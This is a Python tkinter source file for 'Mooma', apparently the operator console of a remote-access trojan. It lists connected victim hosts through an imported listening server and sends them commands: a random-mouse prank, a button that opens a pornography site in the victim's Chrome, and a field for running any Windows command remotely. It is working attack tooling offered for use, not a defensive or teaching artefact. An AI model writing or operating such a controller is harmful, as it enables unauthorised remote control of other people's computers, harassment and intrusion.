import tkinter as tk
import tkinter.scrolledtext as scrolledtext
import tkinter.font as tkFont
import math
from server import MoomaServer

def random_mouse():
    msg = 'random'
    send(msg)

def prn():
    msg = 'start chrome www.pornhub.com'
    send(msg)

def send(msg):
    index = host_list.curselection()[0]
    res = mooma.send_command(mooma.connection_list[index][0], msg)
    txt.insert('end', res)
    txt.insert('end', '\n')

def send_windows_cmd():
    in_cmd = cmd_entry.get()
    send(in_cmd)

def update_hosts():
    mooma.remove_disconnected()
    host_list.delete(0, tk.END)
    for item in mooma.connection_list:
        host_list.insert('end', str(item[1][0])+' : '+str(item[1][1]))

window = tk.Tk()
window.title('Mooma')
window.geometry('1000x750')
window.iconbitmap('./horse.ico')
#window.configure(background='white')
fontStyle_bold = tkFont.Font(family='Open sans bold', size=12)
fontStyle = tkFont.Font(family='Open sans', size=10)
mooma = MoomaServer()
mooma.start_listening()
img_png = tk.PhotoImage(file = 'logo.png')
label_img = tk.Label(window, image = img_png)
label_img.pack()

mid_frame = tk.Frame(window)
mid_frame.pack(side=tk.TOP)

host_frame = tk.Frame(mid_frame)
host_frame.pack(side=tk.LEFT, padx=50)
host_label = tk.Label(host_frame, text='Select a connected host', font=fontStyle_bold)
host_label.pack(side=tk.TOP)
host_list = tk.Listbox(host_frame, width=42) 
for item in mooma.connection_list:
    host_list.insert('end', str(item[1][0])+' : '+str(item[1][1]))
host_list.pack()
refresh_btn = tk.Button(host_frame, text='Refresh hosts', width=20, command=update_hosts, font=fontStyle)
refresh_btn.pack(pady=12)

cmd_frame = tk.Frame(mid_frame)
cmd_frame.pack(side=tk.RIGHT)
cmd_label = tk.Label(cmd_frame, text='Choose a command', font=fontStyle_bold)
cmd_label.pack(side=tk.TOP)
cmd_btn = tk.Button(cmd_frame, text='Random Mouse', command=random_mouse, width=15, font=fontStyle)
cmd_btn.pack(pady=5)
cmd_btn2 = tk.Button(cmd_frame, text='PopcORN HUB', command=prn, width=15, font=fontStyle)
cmd_btn2.pack()
cmd_label2 = tk.Label(cmd_frame, text='Or enter other windows command', font=fontStyle)
cmd_label2.pack(side=tk.TOP, pady=5)
cmd_entry = tk.Entry(cmd_frame)
cmd_entry.pack(side=tk.LEFT)
cmd_btn2 = tk.Button(cmd_frame, text='Send', command=send_windows_cmd, font=fontStyle)
cmd_btn2.pack(side=tk.RIGHT, padx = 10)

txtlbl = tk.Label(window, text='History Log', font=fontStyle_bold)
txtlbl.pack()
txt = scrolledtext.ScrolledText(window, undo=True, width=60)
txt['font'] = ('consolas', '12')
txt.pack()

window.mainloop()
